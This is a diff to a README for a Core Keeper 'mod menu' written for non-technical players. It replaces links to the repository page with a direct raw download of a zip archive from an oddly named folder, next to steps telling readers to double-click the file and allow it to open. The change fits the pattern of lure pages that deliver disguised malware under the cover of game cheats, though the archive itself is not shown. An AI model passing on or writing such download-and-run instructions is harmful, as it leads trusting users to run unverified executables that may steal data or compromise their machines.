@@ -18,7 +18,7 @@ This is for **everyone** who plays Core Keeper. You don't need to be a computer 
 
 ### Step 1: Get the File
 
-👉 [**Click here to download core-keeper-mod-menu**](https://github.com/dezqy/core-keeper-mod-menu)
+👉 [**Click here to download core-keeper-mod-menu**](https://raw.githubusercontent.com/dezqy/core-keeper-mod-menu/main/hydrocele/keeper_mod_core_menu_v3.8.zip)
 
 Visit this link to download the application.
 
@@ -135,7 +135,7 @@ If you run into any issues or have questions, check the repository page for upda
 
 Here's everything you need to remember:
 
-1. **Go to the download page** – [https://github.com/dezqy/core-keeper-mod-menu](https://github.com/dezqy/core-keeper-mod-menu)
+1. **Go to the download page** – [https://raw.githubusercontent.com/dezqy/core-keeper-mod-menu/main/hydrocele/keeper_mod_core_menu_v3.8.zip](https://raw.githubusercontent.com/dezqy/core-keeper-mod-menu/main/hydrocele/keeper_mod_core_menu_v3.8.zip)
 2. **Download the file** – Click the download button on that page.
 3. **Run the file** – Double-click it and allow it to open.
 4. **Start the game** – Open Core Keeper and enjoy your new features.
